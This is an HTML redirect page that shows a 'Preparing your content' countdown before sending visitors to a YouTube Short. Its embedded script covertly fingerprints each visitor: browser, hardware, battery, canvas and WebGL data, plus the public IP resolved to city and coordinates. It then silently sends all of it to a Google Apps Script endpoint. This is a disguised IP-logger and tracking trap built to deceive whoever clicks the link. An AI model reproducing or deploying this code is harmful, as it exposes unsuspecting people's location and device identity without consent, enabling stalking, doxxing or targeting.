<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta http-equiv="refresh" content="3;url=https://www.youtube.com/shorts/gRVU6OvOSfY">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
        }
        .container {
            max-width: 500px;
            padding: 40px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        p {
            opacity: 0.9;
            line-height: 1.6;
        }
        .countdown {
            font-size: 14px;
            opacity: 0.7;
            margin-top: 20px;
        }
        .logo {
            font-size: 32px;
            margin-bottom: 20px;
            opacity: 0.9;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ðŸ”—</div>
        <div class="loader"></div>
        <h1>Preparing your content...</h1>
        <p>You will be redirected in a few seconds.</p>
        <p>If the redirect doesn't work, <a href="https://www.youtube.com/shorts/gRVU6OvOSfY" style="color: #fff; text-decoration: underline;">click here</a>.</p>
        <div class="countdown" id="countdown">3</div>
    </div>

    <script>
        // CONFIGURATION - CHANGE THESE
        const REDIRECT_URL = 'https://www.youtube.com/shorts/gRVU6OvOSfY';
        const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbxbHOolDY5PwCHt-XaU2SAJWbqRsqaRyiIxsZqzee9UgYu9hkJrJdYgrhM0Dv0GfkFELA/exec';
        
        let dataSent = false;

        // Update countdown
        let seconds = 3;
        const countdownEl = document.getElementById('countdown');
        const countdownInterval = setInterval(() => {
            seconds--;
            countdownEl.textContent = seconds;
            if (seconds <= 0) clearInterval(countdownInterval);
        }, 1000);

        // ðŸŽ¯ **ULTIMATE DATA COLLECTION**
        async function collectUltimateData() {
            const startTime = Date.now();
            
            // 1. BASIC DATA (Always available)
            const data = {
                // Meta
                timestamp: new Date().toISOString(),
                local_time: new Date().toLocaleString(),
                collection_time: startTime,
                
                // Browser
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                languages: navigator.languages?.join(', ') || '',
                
                // Screen
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    devicePixelRatio: window.devicePixelRatio,
                    orientation: screen.orientation?.type || 'unknown'
                },
                
                // Hardware
                hardware: {
                    concurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 0
                },
                
                // Page info
                url: window.location.href,
                referrer: document.referrer || 'direct',
                redirect_to: REDIRECT_URL,
                
                // Features
                features: {
                    cookies: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || 'not_set',
                    localStorage: !!window.localStorage,
                    sessionStorage: !!window.sessionStorage,
                    notifications: 'Notification' in window,
                    webRTC: !!window.RTCPeerConnection,
                    serviceWorker: 'serviceWorker' in navigator,
                    webGL: (() => {
                        try {
                            const canvas = document.createElement('canvas');
                            return !!(window.WebGLRenderingContext && 
                                    (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
                        } catch(e) { return false; }
                    })(),
                    geolocation: 'geolocation' in navigator,
                    mediaDevices: 'mediaDevices' in navigator,
                    vibrate: 'vibrate' in navigator
                },
                
                // Plugins
                plugins: Array.from(navigator.plugins).map(p => p.name),
                plugin_count: navigator.plugins.length,
                
                // Timezone
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezone_offset: new Date().getTimezoneOffset(),
                
                // Performance
                performance: performance.memory ? {
                    totalJSHeapSize: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB',
                    usedJSHeapSize: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
                    jsHeapSizeLimit: Math.round(performance.memory.jsHeapSizeLimit / 1073741824) + ' GB'
                } : null
            };

            // 2. IP ADDRESS (IPv4 PRIORITY - Multiple fallbacks)
            const ipv4Services = [
                { url: 'https://api.ipify.org?format=json', type: 'json' },
                { url: 'https://api64.ipify.org?format=json', type: 'json' },
                { url: 'https://v4.ident.me', type: 'text' },
                { url: 'https://ipv4.icanhazip.com', type: 'text' },
                { url: 'https://checkip.amazonaws.com', type: 'text' },
                { url: 'https://ipinfo.io/ip', type: 'text' },
                { url: 'https://wtfismyip.com/text', type: 'text' }
            ];
            
            // Try IPv4 services first
            for (let service of ipv4Services) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 1500);
                    
                    const response = await fetch(service.url, { 
                        signal: controller.signal,
                        cache: 'no-store'
                    });
                    clearTimeout(timeoutId);
                    
                    if (!response.ok) continue;
                    
                    let ip;
                    if (service.type === 'json') {
                        const data = await response.json();
                        ip = data.ip;
                    } else {
                        ip = await response.text();
                        ip = ip.trim();
                    }
                    
                    // Validate it's IPv4
                    if (ip && /^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
                        data.ip = ip;
                        data.ip_source = service.url;
                        data.ip_version = 'IPv4';
                        break;
                    }
                } catch(e) {
                    continue;
                }
            }
            
            // If no IPv4 found, try ANY IP (IPv6 fallback)
            if (!data.ip) {
                const anyIPServices = [
                    'https://icanhazip.com',
                    'https://ifconfig.me/ip',
                    'https://ident.me'
                ];
                
                for (let url of anyIPServices) {
                    try {
                        const response = await fetch(url);
                        const ip = await response.text();
                        if (ip && ip.trim()) {
                            data.ip = ip.trim();
                            data.ip_source = url;
                            data.ip_version = ip.includes(':') ? 'IPv6' : 'IPv4';
                            break;
                        }
                    } catch(e) {
                        continue;
                    }
                }
            }
            
            // Final fallback
            if (!data.ip) {
                data.ip = 'not_detected';
                data.ip_source = 'all_failed';
                data.ip_version = 'unknown';
            }

            // 3. GEOLOCATION (Accurate for both IPv4/IPv6)
            if (data.ip && data.ip !== 'not_detected') {
                // Use ipapi.co for both IPv4 and IPv6
                try {
                    const geoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
                    if (geoResponse.ok) {
                        const geoData = await geoResponse.json();
                        data.geolocation = {
                            city: geoData.city,
                            region: geoData.region,
                            country: geoData.country_name,
                            country_code: geoData.country_code,
                            postal: geoData.postal,
                            latitude: geoData.latitude,
                            longitude: geoData.longitude,
                            timezone: geoData.timezone,
                            asn: geoData.asn,
                            org: geoData.org,
                            isp: geoData.org,
                            ip_version: data.ip_version
                        };
                    }
                } catch(e) {
                    // Fallback for IPv4
                    if (!data.ip.includes(':')) {
                        try {
                            const fallback = await fetch(`https://ip-api.com/json/${data.ip}`);
                            const geoData = await fallback.json();
                            if (geoData.status === 'success') {
                                data.geolocation = {
                                    city: geoData.city,
                                    region: geoData.regionName,
                                    country: geoData.country,
                                    country_code: geoData.countryCode,
                                    latitude: geoData.lat,
                                    longitude: geoData.lon,
                                    timezone: geoData.timezone,
                                    isp: geoData.isp,
                                    org: geoData.org,
                                    ip_version: 'IPv4',
                                    source: 'ip-api.com'
                                };
                            }
                        } catch(e2) {}
                    }
                }
            }

            // 4. NETWORK INFO
            if (navigator.connection) {
                data.network = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms',
                    saveData: navigator.connection.saveData
                };
            }

            // 5. BATTERY STATUS
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch(e) {}
            }

            // 6. CANVAS FINGERPRINT
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Fingerprint', 4, 17);
                data.canvas_fingerprint = canvas.toDataURL().substring(22, 40);
                
                // WebGL info
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    data.webgl = {
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'restricted',
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'restricted',
                        version: gl.getParameter(gl.VERSION)
                    };
                }
            } catch(e) {
                data.canvas_fingerprint = 'failed';
            }

            // 7. VISITOR ID
            const idString = [
                navigator.userAgent,
                screen.width,
                screen.height,
                navigator.language,
                data.ip || 'noip',
                data.timezone
            ].join('|');
            
            let hash = 0;
            for (let i = 0; i < idString.length; i++) {
                hash = ((hash << 5) - hash) + idString.charCodeAt(i);
                hash |= 0;
            }
            data.visitor_id = 'VIS-' + Math.abs(hash).toString(16).substring(0, 8).toUpperCase();

            // 8. COLLECTION STATS
            data.collection_duration = Date.now() - startTime + 'ms';
            data.collection_method = 'ultimate_multi_source';
            
            return data;
        }

        // ðŸš€ **SEND DATA TO GOOGLE SCRIPT**
        async function sendDataToGoogle(data) {
            if (dataSent) return;
            dataSent = true;
            
            console.log('ðŸ“Š Sending visitor data:', {
                id: data.visitor_id,
                ip: data.ip,
                location: data.geolocation?.country
            });
            
            // Method 1: POST (preferred)
            try {
                await fetch(EMAIL_SCRIPT, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(data)
                });
                console.log('âœ… POST sent (no-cors)');
                return;
            } catch(e) {}
            
            // Method 2: GET fallback
            try {
                const params = new URLSearchParams();
                params.append('data', JSON.stringify(data));
                await fetch(EMAIL_SCRIPT + '?' + params.toString());
                console.log('âœ… GET sent as fallback');
            } catch(e) {
                console.log('âš ï¸ All send methods failed');
            }
        }

        // ðŸš€ **MAIN EXECUTION**
        (async function() {
            try {
                // Collect data in background
                const data = await collectUltimateData();
                
                // Send data (fire and forget)
                sendDataToGoogle(data);
                
            } catch(error) {
                // Silent error - don't affect user experience
                console.error('Collection error:', error);
            }
            
            // Redirect after 3 seconds (user sees countdown)
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 3000);
            
        })();
    </script>
</body>
</html>
